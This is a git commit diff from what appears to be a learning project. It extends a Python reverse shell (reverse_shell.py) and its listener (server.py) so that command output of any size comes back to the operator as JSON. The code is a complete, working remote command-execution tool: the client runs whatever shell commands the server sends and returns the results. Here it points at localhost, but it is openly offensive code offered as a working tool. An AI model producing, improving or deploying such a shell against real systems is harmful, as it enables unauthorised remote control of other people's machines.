f3023ceb1c5fef2c8e4befbac83952a78f46a521
NN4TT4NN <n4tt4n.0l1v31r4@gmail.com>
2024-06-26 17:28:55 -0300

    feat: receive back any size of data

--- reverse_shell.py
+++ reverse_shell.py
@@ -1,20 +1,41 @@
 #!/usr/bin/python3
+import json 
 import socket
 import subprocess
+
+
+def reliable_send(data):
+    json_data = json.dumps(data)
+    sock.send(json_data.encode())
+
+
+def reliable_recv():
+    json_data = ""
+    while True:
+        try:
+            json_data = json_data + sock.recv(1024).decode()
+            return json.loads(json_data)
+        except ValueError:
+            continue
+
+
+def shell():
+    while True:
+        command = reliable_recv()
+        if command == "q":
+            break
+        else:
+            try:
+                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
+                                        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                result = proc.stdout.read() + proc.stderr.read()
+                reliable_send(result.decode())
+            except:
+                reliable_send("[!!] Can't Execute That Command")
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.connect(("127.0.0.1", 12345))
 print("Connection stablished to server!")
-
-while True:
-    command = sock.recv(1024).decode()
-
-    if command == "q":
-        break
-    else:
-        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
-                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        result = proc.stdout.read() + proc.stderr.read()
-        sock.send(result)
+shell()
 sock.close()
--- server.py
+++ server.py
@@ -1,31 +1,53 @@
 #!/usr/bin/python3
+import json
 import socket
 
 
-# CREATES THE SOCKET
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+def reliable_send(data):
+    json_data = json.dumps(data)
+    target.send(json_data.encode())
 
-# BINDING
-s.bind(("127.0.0.1", 12345))
-s.listen(1)
-print("Listening for incoming connections...")
 
-# ACCEPT CONNECTION
-target, ip = s.accept()
-print("Target Connected!")
+def reliable_recv():
+    json_data = ""
+    while True:
+        try:
+            json_data = json_data + target.recv(1024).decode()
+            return json.loads(json_data)
+        except ValueError:
+            continue
 
-while True:
 
-    # SEND AND RECEIVE COMMANDS
-    command = input("* Shell#~%s: " % str(ip))
-    target.send(command.encode())
-    
-    if command == "q":
-        break
-    else:
-        result = target.recv(1024).decode()
-        print(result)
+def shell():
+    while True:
+        # SEND AND RECEIVE COMMANDS
+        command = input("* Shell#~%s: " % str(ip))
+        reliable_send(command)
+        if command == "q":
+            break
+        else:
+            result = reliable_recv()
+            print(result)
 
-# CLOSE CONNECTION
+
+def server():
+    global s
+    global ip
+    global target
+
+    # CREATES THE SOCKET
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+    # BIND PORT
+    s.bind(("127.0.0.1", 12345))
+    s.listen(1)
+    print("Listening for incoming connections...")
+
+    # ACCEPT CONNECTION
+    target, ip = s.accept()
+    print("Target Connected!")
+
+server()
+shell()
 s.close()
